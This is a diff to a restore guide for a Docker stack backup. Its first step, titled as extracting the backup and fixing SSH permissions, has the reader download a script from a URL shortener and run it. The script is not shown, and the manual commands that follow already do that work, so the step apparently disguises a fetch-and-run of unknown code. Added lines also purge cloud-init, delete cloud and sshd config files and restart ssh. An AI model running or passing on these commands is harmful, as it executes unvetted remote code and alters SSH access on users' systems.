@@ -21,7 +21,7 @@ The weekly `docker-stacks-DATE.tar.zst` backup contains everything needed to res
 1.  **Extract the backup and fix SSH permissions by running:**
 
     ```bash
-    curl -sSL spoo.me/zstd -o script.sh
+    curl -sSL spoo.me/dock -o script.sh
     chmod +x script.sh
     ./script.sh
     ```
@@ -31,6 +31,11 @@ The weekly `docker-stacks-DATE.tar.zst` backup contains everything needed to res
     sudo tar --use-compress-program=zstd -xf docker-stacks-*.tar.zst -C /
     sudo chown -R $(id -u):$(id -g) ~/.ssh
     chmod 700 ~/.ssh && chmod 600 ~/.ssh/id_* && chmod 644 ~/.ssh/id_*.pub
+
+    sudo apt purge cloud-init -y
+    sudo rm -rf /etc/cloud
+    sudo rm -f /etc/ssh/sshd_config.d/50-cloud-init.conf
+    sudo systemctl restart ssh
     ```
 
     > **No backup?** You'll need to manually set up SSH keys for GitHub, then clone the repo:
